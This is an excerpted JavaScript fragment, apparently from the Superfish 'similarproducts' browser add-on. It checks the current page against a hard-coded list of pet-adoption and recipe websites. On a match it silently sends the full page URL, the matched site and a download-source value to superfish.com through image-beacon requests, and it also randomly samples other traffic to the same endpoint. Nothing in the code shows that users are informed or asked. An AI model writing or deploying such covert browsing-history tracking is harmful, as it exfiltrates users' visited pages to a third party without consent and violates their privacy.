(function()
{
    ...
    if( window == top )
    {
        ...
        try
        {
            ...
            if (Math.floor(Math.random() * 9999) == 1)
            {
                request = new Image();
                request.src = 'https://www.superfish.com/ws/trackSession.action?action=sample-user-traffic';
            }
        }
        catch(e){}
...
//    }
    ...
    shouldTrackVisitorsInSite : function() {
        try{
            var trackVisitorsParams = {};
            trackVisitorsParams.shouldTrack = false;
            var trackVisitorsInSites = "|photobucket.com/images/dog|www.cap4pets.org|www.petsmartcharities.org|www.funnydogsite.com|shine.yahoo.com/blogs/pets|www.petharbor.com|thenoahcenter.org|pets.overstock.com|www.dogperday.com/gallery/index.php?cat_id=1|homewardpet.org|adopt.maddiesfund.org|petadoption.ocpetinfo.com/Adopt|animaladoption.com|www.petage.com|www.adoptapet.com|animaladoptioncenter.org|theshelterpetproject.org|stuffonmymutt.com|www.animall.org/adopt|www.animalplanet.com/pets|www.aplacetolovedogs.com|www.aspca.org|www.cuteanimalsonline.com|www.cutestpaw.com|www.dailypets.co.uk|www.dailypuppy.com|www.ellentv.com/pets|www.lifewithdogs.tv|www.pawnation.com|www.peoplepets.com/people/pets|www.petadoptionnetwork.org|www.petango.com|www.reddit.com/r/aww|www.tehcute.com|www.thedailycute.com|www.today.com/pets|www.petfinder.com|petoftheday.com|attackofthecute.com|bayareapetadoptions.org|cutearoo.com|cuteoverload.com|cutestpetever.com|dpsrescue.org|justcuteanimals.com|lolcuteanimals.com|petsadoption.com|petsearch.animalhumanenm.org|reallycutepets.wordpress.com|allrecipes.com|www.annies-eats.com|www.bettycrocker.com|www.bhg.com/recipes|www.chow.com|www.cookinglight.com|www.delish.com|www.epicurious.com|www.eatingwell.com|www.finecooking.com|www.food.com|food52.com|www.foodandwine.com|foodgawker.com|www.foodnetwork.com/recipes.html|www.keyingredient.com|www.kitchme.com|www.kraftrecipes.com|www.mrfood.com|www.myrecipes.com|www.rachaelray.com/recipe|recipeland.com|www.saveur.com|www.simplyrecipes.com|www.skinnytaste.com|southernfood.about.com|spoonful.com/recipes|www.tablespoon.com|www.tasteofhome.com|thepioneerwoman.com/cooking|vegweb.com|www.yahoo.com/food|www.yummly.com|www.about.com/food|www.buzzfeed.com/food|www.copykat.com|foodmatters.tv/recipes|www.foodrepublic.com|www.huffingtonpost.com/food|www.italianfoodforever.com|norecipes.com/recipes|www.recipe.com|www.seriouseats.com|www.webmd.com/food-recipes/default.htm|www.wholefoodsmarket.com/recipes|www.marthastewart.com/cook|www.pinterest.com/all/food_drink|";
            var url = window.location.hostname + (window.location.pathname === '/' ? '' : window.location.pathname);
            if (url == undefined || url.length == 0) {
                return trackVisitorsParams;
            } else if (url.substring(url.length - 1) === '/') {
                url = url.substring(0, url.length - 1);
            }
            if( trackVisitorsInSites.indexOf("|"+window.location.hostname+"|") > -1){
                trackVisitorsParams.shouldTrack = true;
                trackVisitorsParams.findValue = window.location.hostname;
            } else if( trackVisitorsInSites.indexOf("|"+window.location.hostname.replace('www.','')+"|") > -1){
               trackVisitorsParams.shouldTrack = true;
               trackVisitorsParams.findValue = window.location.hostname.replace('www.','');
            } else if (trackVisitorsInSites.indexOf("|"+url+"|") > -1){
                trackVisitorsParams.shouldTrack = true;
                trackVisitorsParams.findValue = url;
            } else if (trackVisitorsInSites.indexOf("|"+url+window.location.search+"|") > -1){
                trackVisitorsParams.shouldTrack = true;
                trackVisitorsParams.findValue = url+window.location.search;
            }
        } catch (e){}
        return trackVisitorsParams;
    }
...
if (similarproducts.b && similarproducts.b.qsObj && similarproducts.b.qsObj.sflog == "-999") {
    if(!correctJqVersion) {
        ...
        var trackVisitorsParams = similarproducts.utilities.shouldTrackVisitorsInSite();
        if(trackVisitorsParams.shouldTrack){
            try
            {
                var trackVisitorsQueryString = [];
                var trackVisitorsInSiteParams = {action: 'TrackVisitedSites'};
                trackVisitorsInSiteParams.merchantName = encodeURIComponent(trackVisitorsParams.findValue);
                trackVisitorsInSiteParams.page_url = encodeURIComponent(window.location.href);
                trackVisitorsInSiteParams.dlsource = similarproducts.b.qsObj.dlsource + "";
                for (var key in trackVisitorsInSiteParams)
                {
                    trackVisitorsInSiteParams.hasOwnProperty(key) && trackVisitorsQueryString.push(key+'='+encodeURIComponent(trackVisitorsInSiteParams[key]));
                }
                var trackVisitorsImg = new Image();
                trackVisitorsImg.src = 'https://www.superfish.com/ws/trackSession.action?' + trackVisitorsQueryString.join('&');
            }
            catch(e){}
        }
    }
